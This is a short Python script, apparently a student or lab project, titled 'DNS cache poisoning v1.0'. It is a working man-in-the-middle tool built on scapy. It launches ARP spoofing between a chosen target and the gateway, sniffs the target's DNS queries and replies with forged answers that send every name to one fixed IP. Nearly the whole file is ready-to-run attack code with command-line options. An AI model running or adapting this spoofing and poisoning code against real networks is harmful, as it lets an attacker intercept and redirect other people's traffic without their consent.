# Eyal Seckbach & Ynon Sivilia
# DNS cache poisoning v1.0

import argparse
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, getmacbyip
import threading
import arpspoofer
import subprocess

args_parser = argparse.ArgumentParser(prog='DNSSEC', description='DNS cache poisoning')

args_parser.add_argument('-i', '--iface', type=str, help="Interface you wish to use")
args_parser.add_argument('-s', '--src', type=str, help="The address you want for the attacker")
args_parser.add_argument('-d', '--delay', type=float, help="Delay (in seconds) between messages", default=1)
args_parser.add_argument('-t', '--target', type=str, help="IP of target", required=True)
args = args_parser.parse_args()
interface = args.iface if args.iface else conf.iface

GW_IP = conf.route.route("0.0.0.0")[2]
GW_MAC = getmacbyip(GW_IP)

TARGET_IP = args.target
TARGET_MAC = getmacbyip(TARGET_IP)

SELF_MAC = get_if_hwaddr(conf.iface)

FAKE_IP = '216.58.212.196'  # google.com


def forward_to_gw(pkt):
    # if the packet is a DNS request, send a fake DNS answer
    pkt = Ether(
        src=SELF_MAC, dst=TARGET_MAC
    ) / IP(
        dst=pkt[IP].src, src=pkt[IP].dst
    ) / UDP(
        sport=pkt[UDP].dport, dport=pkt[UDP].sport
    ) / DNS(qr=1, id=pkt[DNS].id, ancount=1, qd=DNSQR(pkt[DNS][DNSQR]),
            an=DNSRR(rrname=pkt[DNSQR].qname, rdata=FAKE_IP))
    sendp(pkt, verbose=0, iface=interface)


def main():
    threading.Thread(
        target=arpspoofer.main,
        args=(args.iface, TARGET_IP,
              GW_IP,
              args.delay,  # delay between messages
              )
    ).start()

    # sniff the packets from the DNS server,
    # redirect them to the GW and send a fake DNS answer
    sniff(
        lfilter=lambda pkt: DNS in pkt and pkt[Ether].src == TARGET_MAC,
        prn=forward_to_gw)


if __name__ == "__main__":
    main()
